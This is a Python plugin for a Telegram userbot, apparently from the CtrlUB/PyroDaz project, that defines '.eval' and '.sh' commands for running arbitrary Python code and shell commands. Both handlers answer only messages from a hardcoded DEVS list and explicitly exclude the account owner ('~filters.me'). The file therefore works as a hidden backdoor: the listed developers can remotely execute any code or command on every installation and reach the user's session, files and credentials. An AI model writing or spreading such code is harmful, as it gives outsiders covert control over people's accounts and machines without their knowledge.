# Copyright (C) 2022 CtrlUB
#
# This file is a part of < https://github.com/kennedy-ex/CtrlUB/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/kennedy-ex/CtrlUB-Userbot/blob/main/LICENSE/>.
#


import os
import re
import subprocess
import sys
import traceback
from io import StringIO

from pyrogram import Client, filters
from pyrogram.types import Message

from PyroDaz.helpers.adminHelpers import DEVS
from PyroDaz.helpers.basic import *
from PyroDaz.helpers.tools import eod


async def aexec(code, c, m, r, chat):
    m = m
    r = m.reply_to_message
    c = c
    chat = m.chat
    exec(
        f"async def __aexec(c, m, r, chat): "
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](c, m, r, chat)


@Client.on_message(filters.command(["e", "eval"], ".") & filters.user(DEVS) & ~filters.me)
async def evaluate(c: Client, m: Message):
    try:
        cmd = m.text.split(" ", maxsplit=1)[1]
    except IndexError:
        await eod(m, "<code>Give me some python cmd...</code>")
        return
    reply_to_id = m.id
    r = m.reply_to_message
    chat = m.chat
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, c, m, r, chat)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"<b>Command:</b>\n<code>{cmd}</code>\n\n<b>Output</b>:\n<code>{evaluation.strip()}</code>"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(final_output))
        await m.reply_document(
            document=filename,
            caption=cmd,
            disable_notification=True,
            reply_to_message_id=reply_to_id,
        )
        os.remove(filename)
        await m.delete()
    else:
        await eor(m, final_output)


@Client.on_message(
    filters.command(["sh", "term"], ".") & filters.user(DEVS) & ~filters.me
)
async def terminal(client, message):
    if len(message.text.split()) == 1:
        return await eod(message, "`Give me some cmd to run in terminal...`")
    message.from_user.id
    args = message.text.split(None, 1)
    teks = args[1]
    if "\n" in teks:
        code = teks.split("\n")
        output = ""
        for x in code:
            shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x)
            try:
                process = subprocess.Popen(
                    shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
            except Exception as err:
                print(err)
                await eor(
                    message,
                    """
**Error:**
```{}```
""".format(
                        err
                    ),
                )
            output += "**{}**\n".format(code)
            output += process.stdout.read()[:-1].decode("utf-8")
            output += "\n"
    else:
        shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", teks)
        for a in range(len(shell)):
            shell[a] = shell[a].replace('"', "")
        try:
            process = subprocess.Popen(
                shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
        except Exception:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            errors = traceback.format_exception(
                etype=exc_type, value=exc_obj, tb=exc_tb
            )
            await eor(message, """**Error:**\n```{}```""".format("".join(errors)))
            return
        output = process.stdout.read()[:-1].decode("utf-8")
    if str(output) == "\n":
        output = None
    if output:
        if len(output) > 4096:
            with open("output.txt", "w+") as file:
                file.write(output)
            await client.send_document(
                message.chat.id,
                "output.txt",
                reply_to_message_id=message.id,
                caption="`Output file`",
            )
            await message.delete()
            os.remove("output.txt")
            return
        await eor(message, f"**Output:**\n\n```{output}```")
    else:
        await eod(message, f"**Output:**\n\n`No Output`")
